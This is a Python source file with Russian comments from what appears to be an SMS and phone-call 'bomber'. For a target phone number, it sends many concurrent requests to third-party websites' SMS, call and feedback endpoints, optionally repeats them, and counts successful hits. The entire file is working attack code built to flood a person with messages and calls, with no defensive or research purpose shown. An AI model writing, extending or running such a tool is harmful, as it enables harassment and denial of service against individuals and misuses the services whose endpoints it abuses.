import asyncio
from asyncio import ensure_future, gather, run
from aiohttp import ClientSession
import colorama
from colorama import Fore, Style
import signal
import sys

from Attack.Services import urls
from Attack.Feedback_Services import feedback_urls
from Config import check_config

colorama.init()

# Флаг для подтверждения выхода
exit_confirmed = False

# Счетчики для общего количества отправленных и успешных запросов
total_requests = 0
successful_requests = 0

# Строки вывода для общего количества и успешных запросов
total_requests_str = "Общее количество отправленных запросов: 0"
successful_requests_str = "Количество успешных запросов: 0"

async def request(session, url):
    global total_requests, successful_requests, total_requests_str, successful_requests_str
    try:
        type_attack = ('SMS', 'CALL', 'FEEDBACK') if check_config()['type_attack'] == 'MIX' else check_config()['type_attack']

        if url['info']['attack'] in type_attack:
            async with session.request(url['method'], url['url'], params=url.get('params'), cookies=url.get('cookies'), headers=url.get('headers'), data=url.get('data'), json=url.get('json'), timeout=20) as response:
                status = response.status

                # Увеличение счетчика общего количества запросов
                total_requests += 1

                # Определение цвета вывода в зависимости от статуса ответа
                output_color = Fore.GREEN if 200 <= status < 300 else Fore.RED

                # Формирование красивого вывода
                output_message = f"{output_color}[{status}] {url['info']['website']}"
                print(output_message)

                # Увеличение счетчика успешных запросов при успешном статусе ответа
                if 200 <= status < 300:
                    successful_requests += 1

                # Обновление строк вывода для общего количества и успешных запросов
                total_requests_str = f"Общее количество отправленных запросов: {total_requests}"
                successful_requests_str = f"Количество успешных запросов: {successful_requests}"

                # Вывод строк общего количества и успешных запросов
                print(total_requests_str)
                print(successful_requests_str)

                
    except Exception as e:
        # Вывод ошибок
        print(f"{Fore.RED}Error occurred: {str(e)}{Style.RESET_ALL}")

async def async_attacks(number):
    async with ClientSession() as session:
        services = (urls(number) + feedback_urls(number)) if check_config()['feedback'] == 'True' else urls(number)
        tasks = [ensure_future(request(session, service)) for service in services]
        await gather(*tasks)

def start_async_attacks(number, replay):
    '''Запуск бомбера'''
    for _ in range(int(replay)):
        run(async_attacks(number))

def signal_handler(sig, frame):
    global exit_confirmed
    print("\nВы уверены, что хотите выйти? (y/n)")
    user_input = input().lower()
    if user_input == 'y':
        exit_confirmed = True
        # Вывод общего количества и успешных запросов перед выходом
        print(total_requests_str)
        print(successful_requests_str)
        sys.exit()
    else:
        print("Продолжаем выполнение...")

# Обработка сигнала SIGINT (Ctrl+C)
signal.signal(signal.SIGINT, signal_handler)
